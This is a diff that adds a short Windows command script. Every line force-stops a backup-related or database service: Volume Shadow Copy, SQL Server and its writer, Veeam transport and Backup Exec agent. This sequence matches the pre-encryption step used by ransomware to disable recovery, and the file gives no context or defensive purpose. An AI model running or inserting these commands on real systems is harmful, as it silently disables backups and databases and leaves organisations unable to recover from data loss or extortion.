@@ -1,0 +1,6 @@
+net stop vss /y
+net stop SQLWriter /y
+net stop MSSQLSERVER /y
+net stop veeamtransportsvc /y
+net stop backupexecagentbrowser /y
+
